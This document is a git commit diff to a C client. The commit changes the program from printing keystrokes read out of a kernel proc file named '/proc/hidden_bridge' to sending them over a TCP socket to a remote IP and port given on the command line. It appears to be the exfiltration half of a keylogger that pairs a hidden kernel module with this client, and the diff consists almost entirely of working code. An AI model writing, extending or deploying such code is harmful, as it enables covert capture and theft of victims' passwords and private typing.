40c6caeda7cc150dbf456c1a988995597ef4c422
SK22449 <shani.kabisher@gmail.com>
2026-07-14 13:49:57 +0000

    Send /proc/hidden_bridge keystrokes to server - TCP sockets

--- client.c
+++ client.c
@@ -3,16 +3,63 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <string.h>
+#include <arpa/inet.h>
 
 #define PROC_FILE "/proc/hidden_bridge"
 #define BUF_SIZE 1024
 
-int main(void)
+int main(int argc, char *argv[])
 {
     char buffer[BUF_SIZE]; // To store the text we get from kernel
     int fd; // Will hold the id number Linux gives us when we open the file
     int bytes_read; // How many bytes the kernel gave
 
+    char *target_ip = (char *)"127.0.0.1"; // Default ip
+    int target_port = 8080; // Default port
+
+    for (int i = 1; i < argc; i++)
+    {
+        if (strcmp(argv[i], "-ip") == 0)
+        {
+            target_ip = argv[i + 1];
+            i++;
+        }
+        else if (strcmp(argv[i], "-port") == 0)
+        {
+            target_port = atoi(argv[i + 1]);
+            i++;
+        }
+    }
+
+    int sock;
+    struct sockaddr_in serv_addr;
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0)
+    {
+        perror("socket");
+        return 1;
+    }
+
+    memset(&serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(target_port);
+
+    if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0)
+    {
+        perror("inet_pton");
+        close(sock);
+        return 1;
+    }
+
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
+    {
+        perror("connect");
+        close(sock);
+        return 1;
+    }
+
+    // Read from /proc and send to server
     while (1)
     {
         fd = open(PROC_FILE, O_RDONLY); // Open /proc/hidden_bridge for reading
@@ -34,12 +81,12 @@ int main(void)
 
         if (bytes_read > 0) // We got data
         {
-            printf("%.*s", bytes_read, buffer); // Just print the raw bytes from buffer
-            fflush(stdout); // Force the terminal to instantly print the text (kernel doesnt add \n)
+            send(sock, buffer, bytes_read, 0); // Send the raw bytes to the server
         }
 
         close(fd);
     }
 
+    close(sock);
     return 0;
 }
